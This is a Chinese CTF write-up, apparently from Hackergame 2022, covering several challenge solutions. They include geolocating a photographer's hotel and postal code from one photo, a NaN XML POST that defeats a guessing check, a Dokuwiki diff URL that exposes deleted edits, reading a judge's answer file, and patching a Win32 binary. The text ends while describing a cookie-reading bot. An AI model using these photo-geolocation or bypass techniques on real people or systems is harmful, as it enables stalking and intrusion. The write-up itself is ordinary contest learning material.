\u56fe\u7247\u6240\u5305\u542b\u7684 EXIF \u4fe1\u606f\u7248\u672c\u662f\u591a\u5c11\uff1f\uff08\u5982 2.1\uff09\u3002 exiftool \u663e\u793a\u662f 0231\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f 2.31 \u3002 \u62cd\u7167\u4f7f\u7528\u624b\u673a\u7684\u54c1\u724c\u662f\u4ec0\u4e48\uff1f exiftool \u53ef\u4ee5\u770b\u5230 Make: Xiaomi \uff0c\u6240\u4ee5\u7b54\u6848\u662f \u5c0f\u7c73/\u7ea2\u7c73 \u3002 \u8be5\u56fe\u7247\u88ab\u62cd\u6444\u65f6\u76f8\u673a\u7684\u611f\u5149\u5ea6\uff08ISO\uff09\u662f\u591a\u5c11\uff1f\uff08\u6574\u6570\u6570\u5b57\uff0c\u5982 3200\uff09 ISO: 84 \uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 84 \u3002 \u7167\u7247\u62cd\u6444\u65e5\u671f\u662f\u54ea\u4e00\u5929\uff1f\uff08\u683c\u5f0f\u4e3a\u5e74/\u6708/\u65e5\uff0c\u5982 2022/10/01\u3002\u6309\u62cd\u6444\u5730\u70b9\u5f53\u5730\u65e5\u671f\u8ba1\u7b97\u3002\uff09 Create Date: 2022:05:14 18:23:35.220027+09:00 \uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 2022/05/14 \u3002 \u7167\u7247\u62cd\u6444\u65f6\u662f\u5426\u4f7f\u7528\u4e86\u95ea\u5149\u706f\uff1f Flash: Off, Did not fire \uff08\u6216\u8005\u770b\u53cd\u5149\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u6240\u4ee5\u7b54\u6848\u4e3a \u5426 \u3002 flag\uff1a flag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF} \u793e\u5de5\u5b9e\u8df5 \u00b6 \u63a5\u4e0b\u6765\u7b2c\u4e8c\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247\u793e\u5de5\u5206\u6790\u7684\u95ee\u9898\u3002 \u8bf7\u5199\u51fa\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\u7684\u90ae\u653f\u7f16\u7801\uff0c\u683c\u5f0f\u4e3a 3 \u81f3 10 \u4f4d\u6570\u5b57\uff0c\u4e0d\u542b\u7a7a\u683c\u6216\u4e0b\u5212\u7ebf\u7b49\u7279\u6b8a\u7b26\u53f7\uff08\u5982 230026\u300194720\uff09\u3002 \u901a\u8fc7\u653e\u5927\u56fe\u7247\u53ef\u4ee5\u770b\u5230\u697c\u4e0b\u7684\u4f53\u80b2\u9986\u5916\u9762\u5199\u7684\u6709 \u201cZOZO\u201d \u6837\u5f0f\uff0c\u641c\u7d22\u53ef\u4ee5\u627e\u5230\u8fd9\u91cc\u662f\u65e5\u672c\u5343\u53f6\u6d77\u6d0b\u7403\u573a\u3002\u901a\u8fc7 Google \u5730\u56fe\u627e\u5230\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\uff1aAPA HOTEL& RESORT TOKYO BAY MAKUHARI \u3012261-0021 Chiba, Mihama Ward, Hibino, 2 Chome-3\uff0c\u6240\u4ee5\u90ae\u7f16\u4e3a 2610021 \u3002\uff08\u8fd9\u91cc\u6709\u4e2a\u5751\uff0c\u65e5\u672c\u90ae\u7f16\u5212\u5206\u5f88\u7ec6\uff0c\u7403\u573a\u548c\u9152\u5e97\u7684\u90ae\u7f16\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u8981\u6ce8\u610f\uff09 \u7167\u7247\u7a97\u6237\u4e0a\u53cd\u5c04\u51fa\u4e86\u62cd\u7167\u4eba\u7684\u624b\u673a\u3002\u90a3\u4e48\u8fd9\u90e8\u624b\u673a\u7684\u5c4f\u5e55\u5206\u8fa8\u7387\u662f\u591a\u5c11\u5462\uff1f\uff08\u683c\u5f0f\u4e3a\u957f + \u5b57\u6bcd x + \u5bbd\uff0c\u5982 1920x1080\uff09 \u901a\u8fc7\u4eac\u4e1c\u641c\u7d22\u5c0f\u7c73\u624b\u673a\uff0c\u4ee5\u53ca\u73bb\u7483\u53cd\u5149\u4e2d\u7684\u540e\u7f6e\u6444\u50cf\u5934\u6837\u5f0f\u53ef\u4ee5\u77e5\u9053\u8fd9\u90e8\u624b\u673a\u662f\u7ea2\u7c73 Note 9\uff0c\u5c4f\u5e55\u5206\u8fa8\u7387\u4e3a 2340x1080 \u3002 \u4ed4\u7ec6\u89c2\u5bdf\uff0c\u53ef\u4ee5\u53d1\u73b0\u7167\u7247\u7a7a\u4e2d\uff08\u767d\u8272\u4e91\u4e0a\u65b9\u4e2d\u95f4\u4f4d\u7f6e\uff09\u6709\u4e00\u67b6\u98de\u673a\u3002\u4f60\u80fd\u8c03\u67e5\u51fa\u8fd9\u67b6\u98de\u673a\u7684\u4fe1\u606f\u5417\uff1f\uff0c\u5305\u62ec \u8d77\u98de\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 PEK\uff09\u3001\u964d\u843d\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 HFE\uff09\u3001\u822a\u73ed\u53f7\uff08\u4e24\u4e2a\u5927\u5199\u5b57\u6bcd\u548c\u82e5\u5e72\u4e2a\u6570\u5b57\uff0c\u5982 CA1813\uff09 \u505a\u8fd9\u9053\u9898\u7684\u65f6\u5019\u65f6\u95f4\u6b63\u597d\u662f\u4e0b\u5348\u4e94\u70b9\u4e8c\u5341\u591a\uff0c\u5bf9\u5e94\u65e5\u672c\u65f6\u95f4\u4e0b\u5348\u516d\u70b9\u4e8c\u5341\u591a\uff0c\u4e5f\u5c31\u662f\u7c7b\u4f3c\u62cd\u7167\u7684\u65f6\u95f4\uff0c\u5728\u5b9e\u65f6\u98de\u673a\u822a\u7ebf\u5730\u56fe\u4e2d\u6b63\u597d\u770b\u89c1\u6709\u4e00\u67b6\u98de\u673a\u5728\u8be5\u5904\u4e0a\u7a7a\uff0c\u8d77\u98de\u673a\u573a\u662f HND\u3002\u901a\u8fc7\u98de\u673a\u65b9\u5411\u53ef\u4ee5\u786e\u5b9a\u8d77\u98de\u673a\u573a\u5c31\u662f HND \u3002\u7136\u540e\u627e\u5230\u6bcf\u5929\u5927\u6982\u8fd9\u4e2a\u65f6\u95f4\u4ece HND \u51fa\u53d1\u5411\u5317\u7684\u98de\u673a\uff0c\u901a\u8fc7\u5c1d\u8bd5\u5f97\u5230\u964d\u843d\u673a\u573a\u4e3a HIJ \uff0c\u822a\u73ed\u53f7\u4e3a NH683 \u3002\uff08\u4e5f\u53ef\u4ee5\u7206\u7834\uff0c\u8fd9\u9053\u9898\u7684\u9a8c\u9898\u903b\u8f91\u662f\u5c06\u8868\u5355\u7ed3\u679c\u8fdb\u884c base64\uff0c\u7136\u540e GET \u7ed3\u679c.txt\uff0c\u6b63\u786e\u5219 200 \u4e14\u91cc\u9762\u662f flag\uff0c\u9519\u8bef\u5219 404\uff09 flag\uff1a flag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal} \u731c\u6570\u5b57 \u00b6 \u8fd9\u4e2a\u5c0f\u6e38\u620f\u9700\u8981\u505a\u7684\u4e8b\u60c5\u975e\u5e38\u7b80\u5355\uff1a\u5728 0 \u548c 1 \u4e4b\u95f4\u731c\u4e00\u4e2a\u6570\u5b57\uff08\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e 6 \u4f4d\uff09\uff0c\u5e76\u901a\u8fc7\u53cd\u9988\u7684\u300c\u5927\u300d\u8fd8\u662f\u300c\u5c0f\u300d\u4fee\u6b63\u731c\u6d4b\uff0c\u76f4\u81f3\u5b8c\u5168\u731c\u4e2d\u3002\u4e00\u6b21\u6027\u547d\u4e2d\u7684\u6982\u7387\u663e\u7136\u4e5f\u662f\u4e00\u767e\u4e07\u5206\u4e4b\u4e00\uff08\u548c\u4e94\u8fb9\u5f62\u7684\u300c\u5ae9\u725b\u4e03\u65b9\u300d\u8fbe\u6210\u4e86\u67d0\u79cd\u610f\u4e49\u4e0a\u7684\u540c\u6784\uff09\u2014\u2014\u4f46\u4ece\u5b66\u9738\u5ba4\u53cb\u624b\u4e2d\u501f\u6765\u7684\u6982\u7387\u8bba\u4e0e\u7edf\u8ba1\u5b66\u7b14\u8bb0\u4e0a\u4e07\u5343\u516c\u5f0f\u7684\u6a21\u6837\u5728\u601d\u7eea\u4e2d\u4e00\u77ac\u800c\u8fc7\uff0c\u4e8e\u662f\u4f60\u9ed8\u9ed8\u7948\u7977\u7740\u5927\u6570\u5b9a\u7406\uff0c\u8654\u8bda\u5730\u6309\u4e0b\u4e86\u63d0\u4ea4\u7684\u6309\u94ae\u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u7f51\u9875\u670d\u52a1\u7684 Java \u6e90\u7801\u3002\u672c\u6765\u60f3\u7740\u662f\u7206\u7834\u4f2a\u968f\u673a\u6570\uff0c\u4e0d\u8fc7\u6e90\u7801\u91cc\u7528\u7684\u662f SecureRandom\uff0c\u4e0d\u80fd\u7206\u7834\u3002\u7136\u540e\u4ed4\u7ec6\u770b\u6e90\u7801\u3002\u53d1\u73b0\u4e86\u4e00\u4e9b\u6bd4\u8f83\u53ef\u7591\u7684\u4e1c\u897f\uff0c\u660e\u660e\u6bd4\u8f83\u7684\u90fd\u662f\u516d\u4f4d\u5c0f\u6570\uff0c\u662f\u53ef\u4ee5\u4e58 1000000 \u7136\u540e\u5224\u65ad\u6574\u6570\u76f8\u7b49\u7684\uff0c\u4f46\u5b83\u504f\u8981\u6bd4\u8f83\u8f93\u5165\u548c\u4e24\u4e2a\u5c0f\u6570\u7684\u5927\u5c0f\uff08\u662f\u5426\u4e0d\u5927\u4e8e\u4e14\u4e0d\u5c0f\u4e8e\uff09\u3002\u800c\u5982\u679c\u8f93\u5165\u662f NaN\uff0c\u5219\u4efb\u4f55\u6bd4\u8f83\u90fd\u662f False\uff0c\u4e5f\u5c31\u8ba9\u7a0b\u5e8f\u8ba4\u4e3a\u8f93\u5165\u548c\u9884\u671f\u76f8\u7b49\u4e86\u3002 \u4e0d\u8fc7\u56e0\u4e3a\u89c4\u5b9a\u4e86\u5c0f\u6570\uff0c\u6240\u4ee5 NaN \u5728\u524d\u7aef\u4e0d\u80fd\u76f4\u63a5\u5199\u5165\uff0c\u9700\u8981\u624b\u52a8 POST \u5230 /state \uff0c\u7528\u4e00\u4e2a\u4efb\u610f\u6570\u5b57\u8bd5\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5728 DevTool \u91cc\u6355\u83b7\u5230 POST \u6570\u636e\u683c\u5f0f\u3002\u7136\u540e\u624b\u52a8 POST \u4e00\u4e2a <state><guess>NaN</guess></state> \u518d GET \u4e00\u4e0b\u5c31\u80fd\u5728\u8fd4\u56de\u6570\u636e\u4e2d\u770b\u5230 flag\uff1a flag{gu3ss-n0t-a-numb3r-1nst3ad-\u2026\u2026} Flag \u7684\u75d5\u8ff9 \u00b6 \u5c0f Z \u542c\u8bf4 Dokuwiki \u914d\u7f6e\u5f88\u7b80\u5355\uff0c\u6240\u4ee5\u5728\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u6574\u4e86\u4e00\u4efd\u3002\u53ef\u662f\u4e0d\u5de7\u7684\u662f\uff0c\u4ed6\u4e00\u4e0d\u5c0f\u5fc3\u628a\u73cd\u8d35\u7684 flag \u7c98\u8d34\u5230\u4e86 wiki \u9996\u9875\u63d0\u4ea4\u4e86\uff01\u4ed6\u8d76\u7d27\u6539\u597d\uff0c\u5e76\u4e14\u4e5f\u628a\u5386\u53f2\u8bb0\u5f55\uff08revisions\uff09\u529f\u80fd\u5173\u6389\u4e86\u3002 \u300c\u8fd9\u6837\u5c31\u5e94\u8be5\u5c31\u4e0d\u4f1a\u6cc4\u6f0f flag \u4e86\u5427\u300d\uff0c\u5c0f Z \u5982\u662f\u5b89\u6170\u81ea\u5df1\u3002 \u7136\u800c\u4e8b\u5b9e\u771f\u7684\u5982\u6b64\u5417\uff1f \uff08\u9898\u76ee Dokuwiki \u7248\u672c\u57fa\u4e8e 2022-07-31a \"Igor\"\uff09 \u4e00\u4e2a Dokuwiki \u6846\u67b6\u642d\u7684\u7f51\u7ad9\uff0c\u76ee\u6807\u662f\u627e\u5230\u9996\u9875\u7684\u4fee\u6539\u3002\u7248\u672c\u662f\u6700\u65b0\u7684\uff0c\u641c\u4e0d\u5230\u5565\u6f0f\u6d1e\u3002\u81ea\u5df1\u90e8\u7f72\u4e86\u4e00\u4e0b\u73a9\u73a9\uff0c\u770b\u8d77\u6765 revisions \u7b49\u529f\u80fd\u5173\u6389\u4e4b\u540e\u786e\u5b9e\u6ca1\u6cd5\u770b\u4fee\u6539\u8bb0\u5f55\u4e86\u3002\u800c\u4e14\u9898\u76ee\u662f external edit\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4fee\u6539\u4e86\u6587\u4ef6\uff0c\u800c\u6ca1\u6709\u901a\u8fc7\u7f51\u9875\u7f16\u8f91\u3002 \u7136\u540e\u5c31\u8bfb\u4e86\u8bfb\u6e90\u7801\uff0c\u641c\u4e86\u4e0b issue \u770b\u5230\u4e86\u4e00\u4e2a revision \u76f8\u5173\u7684 https://github.com/splitbrain/dokuwiki/issues/3576 \uff0c\u91cc\u9762\u63d0\u5230\u4e86 ?do=diff \uff0c\u5c1d\u8bd5\u8bbf\u95ee /doku.php?id=start&do=diff \uff0c\u786e\u5b9e\u80fd\u770b\u5230\u4fee\u6539\u8bb0\u5f55\uff0c\u5176\u4e2d flag\uff1a flag{d1gandFInD_d0kuw1k1_unexpectEd_API} \u5b89\u5168\u7684\u5728\u7ebf\u6d4b\u8bc4 \u00b6 \u4f20\u8bf4\u79d1\u5927\u65b0\u7684\u5728\u7ebf\u6d4b\u8bc4\u7cfb\u7edf\uff08Online Judge\uff09\u6b63\u5728\u9510\u610f\u5f00\u53d1\u4e2d\u3002\u7136\u800c\uff0c\u65b0 OJ \u8fdf\u8fdf\u4e0d\u89c1\u8e2a\u5f71\uff0c\u65e7\u7684 OJ \u548c\u66f4\u65e7\u7684 OJ \u5374\u90fd\u5df2\u7ecf\u505c\u6b62\u4e86\u7ef4\u62a4\u3002\u67d0 2022 \u7ea7\u8ba1\u7b97\u673a\u7cfb\u7684\u65b0\u751f\u5c0f L \u7b49\u5f97\u4e0d\u8010\u70e6\u4e86\uff0c\u5f53\u5373\u8868\u793a\u4e0d\u5c31\u662f OJ \u5417\uff0c\u4ed6 10 \u5206\u949f\u5c31\u80fd\u5199\u51fa\u6765\u4e00\u4e2a\u3002 \u65e0\u6cd5 AC \u7684\u9898\u76ee \u4e3a\u4e86\u9a8c\u8bc1\u4ed6\u5199\u7684\u65b0 OJ \u7684\u5b89\u5168\u6027\uff0c\u4ed6\u51b3\u5b9a\u5728 OJ \u4e0a\u51fa\u4e00\u9053\u4e0d\u53ef\u80fd\u5b8c\u6210\u7684\u9898\u76ee\u2014\u2014\u5927\u6574\u6570\u5206\u89e3\uff0c\u5e76\u4e14\u653e\u51fa\u8c6a\u8a00\uff1a\u53ea\u8981\u6709\u4eba\u80fd AC \u8fd9\u9053\u9898\uff0c\u5c31\u80fd\u5f97\u5230\u4f20\u8bf4\u4e2d\u7684 flag\u3002\u5f53\u7136\uff0c\u56e0\u4e3a\u76ee\u524d OJ \u53ea\u80fd\u8fd0\u884c C \u8bed\u8a00\u4ee3\u7801\uff0c\u5373\u4f7f\u8bf7\u6765\u4e00\u4f4d\u5c11\u5e74\u73ed\u5b66\u9662\u7684\u5929\u624d\u6050\u6015\u4e5f\u65e0\u6d4e\u4e8e\u4e8b\u3002 \u52a8\u6001\u6570\u636e \u4e3a\u4e86\u9632\u6b62\u6570\u636e\u610f\u5916\u6cc4\u9732\uff0c\u5c0f L \u8fd8\u7ed9 OJ \u52a0\u5165\u4e86\u52a8\u6001\u6570\u636e\u751f\u6210\u529f\u80fd\uff0c\u6bcf\u6b21\u6d4b\u8bc4\u4f1a\u968f\u673a\u751f\u6210\u4e00\u90e8\u5206\u6d4b\u8bd5\u6570\u636e\u3002\u8fd9\u6837\uff0c\u5373\u4f7f OJ \u6d4b\u8bd5\u6570\u636e\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u4e5f\u6ca1\u529e\u6cd5\u901a\u8fc7\u6240\u6709\u6d4b\u8bd5\u6837\u4f8b\u4e86\u5427\uff01\uff08\u4e5f\u8bb8\u5427\uff1f\uff09 \u7b2c\u4e00\u9898\u5c31\u662f\u4f7f\u7528 ./data/static.in \u548c ./data/static.out \u4f5c\u4e3a\u8f93\u5165\u8f93\u51fa\u3002\u800c\u4e14\u4e5f\u6ca1\u6709\u8bbe\u7f6e\u6743\u9650\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u53d6 ./data/static.out \u5185\u5bb9\u5e76\u8f93\u51fa\u5373\u53ef\u3002flag\uff1a flag{the_compiler_is_my_eyes_b18ad6f041} \u7b2c\u4e8c\u9898\u52a8\u6001\u751f\u6210\u6570\u636e\uff0c\u800c\u4e14\u8bbe\u7f6e\u4e86\u6743\u9650\uff0c\u7528\u6237\u4e0d\u80fd\u8bfb\u53d6\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u505a\u3002 \u7ebf\u8def\u677f \u00b6 \u4e2d\u5348\u8d77\u5e8a\uff0c\u770b\u5230\u5ba4\u53cb\u7684\u684c\u5b50\u4e0a\u53c8\u591a\u4e86\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u76d2\u5b50\u3002\u5feb\u9012\u6807\u7b7e\u4e0a\u4e00\u5982\u65e2\u5f80\u7684\u5199\u7740\uff1a\u7ebf\u8def\u677f\u3002\u548c\u5f80\u5e38\u4e00\u6837\uff0c\u4f60\u201c\u5e2e\u201d\u5ba4\u53cb\u62c6\u5f00\u5feb\u9012\u5e76\u62a2\u5148\u628a\u677f\u5b50\u628a\u73a9\u4e00\u756a\u3002\u53ef\u662f\u7a81\u7136\uff0c\u4f60\u6ce8\u610f\u5230\u677f\u5b50\u8868\u9762\u4f3c\u4e4e\u5199\u7740\u4e9b\u4e1c\u897f\u2026\u2026\u770b\u8d77\u6765\u50cf\u662f\u2026\u2026flag\uff1f \u53ef\u662f\u53ea\u6709\u5f00\u5934\u7684\u51e0\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u770b\u6e05\u695a\u3002\u4f60\u4e00\u65f6\u95f4\u4e0d\u77e5\u6240\u63aa\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u4f60\u901a\u8fc7\u76d2\u5b50\u4e0a\u7684\u8054\u7cfb\u65b9\u5f0f\u627e\u5230\u4e86\u5236\u4f5c\u5382\u5bb6\uff0c\u901a\u8fc7\u677f\u5b50\u4e1d\u5370\u4e0a\u7684\u5e8f\u5217\u53f7\u67e5\u51fa\u4e86\u5ba4\u53cb\u7684\u5e95\u7ec6\uff0c\u5e76\u4ee5\u653e\u5f03\u6bcf\u6708\u4e24\u6b21\u514d\u8d39 PCB \u6253\u6837\u5305\u90ae\u7684\u673a\u4f1a\u4e3a\u4ee3\u4ef7\u8981\u6765\u4e86\u8fd9\u6279\u5e26\u6709 flag \u7684\u677f\u5b50\u7684\u751f\u4ea7\u6587\u4ef6\u3002\u90a3\u8fd9\u4e9b\u6587\u4ef6\u91cc\u4f1a\u4e0d\u4f1a\u5305\u542b\u7740\u66f4\u591a\u6709\u5173 flag \u7684\u4fe1\u606f\u5462\uff1f \u7ed9\u4e86\u4e00\u4e9b gbr \u6587\u4ef6\uff0c\u641c\u4e86\u4e00\u4e0b\u7528 Gerbv \u6253\u5f00\u3002\u53d1\u73b0 flag \u76f8\u5173\u5185\u5bb9\u5728 F_Cu \u8fd9\u90e8\u5206\u4e0a\uff0c\u6709\u4e00\u4e9b\u5706\u73af\u906e\u6321\u4e86\uff0c\u70b9\u51fb\u53bb\u6389\u5c31\u53ef\u4ee5\u770b\u89c1 flag\uff1a flag{8_1ayER_rogeRS_81ind_V1a} Flag \u81ea\u52a8\u673a \u00b6 Hackergame 2022 \u7ec4\u59d4\u4f1a\u4e3a\u5927\u5bb6\u642c\u6765\u4e86\u4e00\u53f0\u80fd\u591f\u81ea\u52a8\u83b7\u53d6 flag \u7684\u673a\u5668\u3002\u7136\u800c\uff0c\u60f3\u8981\u63d0\u53d6\u51fa\u5176\u4e2d\u7684 flag \u4f3c\u4e4e\u6ca1\u90a3\u4e48\u7b80\u5355\u2026\u2026 \u4e00\u4e2a\u4f7f\u7528 Win32 API \u7684\u7a97\u53e3\u7a0b\u5e8f\u7684\u9006\u5411\u3002\u593a\u53d6 flag \u7684\u6309\u94ae\u70b9\u4e0d\u4e0a\u3002\u9006\u5411\u4e00\u4e0b\uff0c\u5728 WinMain \u51fd\u6570\u91cc\u770b\u5230\u6ce8\u518c\u4e86\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u5728 0x401510 \u5904\u3002\u679a\u4e3e\u4e86 msg \u7684\u503c\uff0c\u4e5f\u5c31\u662f\u4e8b\u4ef6\uff1a 1\uff1a\u5373\u521b\u5efa\u7a97\u53e3\uff0c\u521b\u5efa\u4e86\u4e09\u4e2a\u6309\u94ae\uff0c\u4e00\u4e2a\u662f \u201c\u72e0\u5fc3\u593a\u53d6\u201d\uff0c\u5bf9\u5e94\u7684 hMENU \u4e3a 3\uff0c\u4e00\u4e2a \u201c\u653e\u624b\u79bb\u5f00\u201d\uff0chMENU \u4e3a 2\uff0c\u4e00\u4e2a\u6ca1\u6709\u663e\u793a\u4e0d\u7ba1 0x111\uff1a\u5373\u70b9\u51fb\uff0c\u6b64\u65f6\u7684\u53c2\u6570 wParam\uff08\u5373 a3\uff09\u4e3a\u70b9\u51fb\u7684\u6309\u94ae\u7684 hMENU\uff0c\u5f53 a3 \u4e3a 2 \u65f6\u9000\u51fa\uff0ca3 \u4e3a 3 \u65f6\u68c0\u67e5 lParam \u662f\u5426\u4e3a 114514\uff0c\u5982\u679c\u662f\u5219\u8f93\u51fa flag \u5230\u6587\u4ef6\u4e2d \u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u6c47\u7f16\u91cc patch \u4e00\u4e0b\u7a0b\u5e8f\uff0c\u5c06\u5224\u65ad a3 \u4e3a 2 \u6216 3 \u8c03\u6362\u4e00\u4e0b\uff0c\u7136\u540e\u518d\u5c06\u5224\u65ad lParam \u7684 jz \u53d8\u6210 jnz\u3002\u4e4b\u540e Apply\u3001\u8fd0\u884c\u70b9\u51fb\u653e\u624b\u79bb\u5f00\u5373\u53ef\u8f93\u51fa flag\uff1a flag{Y0u_rea1ly_kn0w_Win32API_\u2026\u2026} \u676f\u7a97\u9e45\u5f71 \u00b6 \u8bf4\u5230\u4e0a\u56de\uff0c\u5c0f K \u5728\u83b7\u5f97\u4e86\u5b9e\u9a8c\u5ba4\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8bbf\u95ee\u6743\u9650\u4e4b\u540e\u5c31\u8fc1\u79fb\u4e86\u6570\u636e\uff08\u4ed6\u76f4\u5230\u73b0\u5728\u90fd\u8fd8\u4e0d\u77e5\u9053\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u5907\u4efd\u88ab Eve \u4e0b\u8f7d\u4e86\uff09\u3002\u4e4b\u540e\uff0c\u4e3a\u4e86\u8dd1\u4e00\u4e9b\u522b\u4eba\u5199\u7684\u5728 Windows \u4e0b\u7684\u8ba1\u7b97\u7a0b\u5e8f\uff0c\u4ed6\u5b89\u88c5\u4e86 wine \u6765\u8fd0\u884c\u5b83\u4eec\u3002 \u300c\u4f60\u7528 wine \u8dd1 Windows \u7a0b\u5e8f\uff0c\u8981\u662f\u4e2d\u6bd2\u4e86\u548b\u529e\uff1f\u300d \u300c\u6ca1\u5173\u7cfb\uff0c\u5927\u4e0d\u4e86\u628a wineprefix \u5220\u4e86\u5c31\u884c\u3002\u6211\u8bbe\u7f6e\u8fc7\u4e86\u78c1\u76d8\u6620\u5c04\uff0cWindows \u7a0b\u5e8f\u662f\u8bfb\u4e0d\u5230\u6211\u7684\u6587\u4ef6\u7684\uff01\u300d \u4f46\u679c\u771f\u5982\u6b64\u5417\uff1f \u4e3a\u4e86\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u4f60\u9700\u8981\u70b9\u51fb\u300c\u6253\u5f00/\u4e0b\u8f7d\u9898\u76ee\u300d\u6309\u94ae\uff0c\u4e0a\u4f20\u4f60\u7684\u7a0b\u5e8f\u5b9e\u73b0\u4ee5\u4e0b\u7684\u76ee\u7684\uff1a /flag1 \u653e\u7f6e\u4e86\u7b2c\u4e00\u4e2a flag\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e00\u4e2a flag \u5417\uff1f /flag2 \u653e\u7f6e\u4e86\u7b2c\u4e8c\u4e2a flag\uff0c\u4f46\u662f\u9700\u8981\u4f7f\u7528 /readflag \u7a0b\u5e8f\u624d\u80fd\u770b\u5230 /flag2 \u7684\u5185\u5bb9\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u6267\u884c /readflag \u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e8c\u4e2a flag \u5417\uff1f \u7b2c\u4e00\u4e2a flag \u4e5f\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u8bfb\u53d6 /flag1 \u8f93\u51fa\u5c31\u53ef\u4ee5\u4e86\u3002 \u7b2c\u4e8c\u4e2a flag \u641e\u7684\u65f6\u5019\u8bd5\u8fc7 system\u3001execl \u5565\u7684\uff0c\u4e00\u4e9b\u547d\u4ee4\u90fd\u6ca1\u529e\u6cd5\u6267\u884c\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u529e\uff0c\u4e0d\u60f3\u7814\u7a76\u4e86\uff0c\u5f00\u6446 \u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 \u00b6 \u5c0f X \u4f5c\u4e3a\u67d0\u95e8\u7b26\u53f7\u8ba1\u7b97\u8bfe\u7a0b\u7684\u52a9\u6559\uff0c\u4e3a\u4e86\u8ba9\u5927\u5bb6\u719f\u6089\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u4ed6\u5199\u4e86\u4e00\u4e2a\u5c0f\u7f51\u7ad9\uff1a\u4e0a\u9762\u653e\u7740\u4e94\u9053\u7b80\u5355\u7684\u9898\u76ee\uff0c\u53ea\u8981\u8f93\u5165\u59d3\u540d\u548c\u9898\u76ee\u7b54\u6848\uff0c\u63d0\u4ea4\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u81ea\u5df1\u7684\u5206\u6570\u3002 \u70b9\u51fb\u6b64\u94fe\u63a5\u8bbf\u95ee\u7ec3\u4e60\u7f51\u7ad9\uff08\u6ca1\u94fe\u63a5\uff09 \u60f3\u8d77\u81ea\u5df1\u524d\u51e0\u5929\u5728\u516c\u4f17\u53f7\u4e0a\u5b66\u8fc7\u7684 Java \u8bbe\u8ba1\u6a21\u5f0f\u514d\u8d39\u8bd5\u542c\u8bfe\uff0c\u672c\u7740\u524d\u540e\u7aef\u79bb\u5fc3\uff08\u54a6\uff1f\u662f\u524d\u540e\u7aef\u79bb\u5fc3\u5417\uff1f\u8fd8\u662f\u79bb\u5a5a\uff1f\u79bb\u3002\u3002\u79bb\u8c31\uff1f\u603b\u4e4b\u628a\u529f\u80fd\u80fd\u62c6\u5219\u62c6\u5c31\u5bf9\u5566\uff09\u7684\u601d\u60f3\uff0c\u5c0f X \u8fd8\u5355\u72ec\u5199\u4e86\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6b22\u8fce\u540c\u5b66\u4eec\u628a\u81ea\u5df1\u7684\u6210\u7ee9\u94fe\u63a5\u63d0\u4ea4\u4e0a\u6765\u3002 \u603b\u4e4b\uff0c\u56e0\u4e3a\u5176\u5148\u8fdb\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u9700\u8981\u540c\u5b66\u4eec\u505a\u5b8c\u7ec3\u4e60\u4e4b\u540e\u624b\u52a8\u628a\u6210\u7ee9\u8fde\u63a5\u8d34\u5230\u8fd9\u91cc\u6765\uff1a \u70b9\u51fb\u6b64\u94fe\u63a5\u63d0\u4ea4\u7ec3\u4e60\u6210\u7ee9 URL\uff08\u6ca1\u94fe\u63a5\uff09 \u70b9\u8fdb\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u968f\u4fbf\u505a\u4e00\u904d\uff0c\u5f97\u5230\u6210\u7ee9\u5206\u4eab\u9875\u9762 /share?result=... \uff0c\u7136\u540e\u5c06\u94fe\u63a5\u8d34\u5230\u7b2c\u4e8c\u4e2a\u94fe\u63a5\u91cc\uff0c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u51fa\u540d\u5b57\u548c\u6210\u7ee9\u3002 \u8bfb\u53d6\u7684\u8fc7\u7a0b\u662f\u7528 selenium \u6253\u5f00\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0cGET login \u7136\u540e\u5c06 flag \u653e\u5165 cookie\uff0c\u5728 GET \u8f93\u5165\u7684 url\uff08\u4f1a\u66ff\u6362\u6389 netloc \u4e3a web\uff0cscheme \u4e3a http\uff09\uff0c\u7136\u540e\u8bfb\u53d6 #greeting \u548c #score 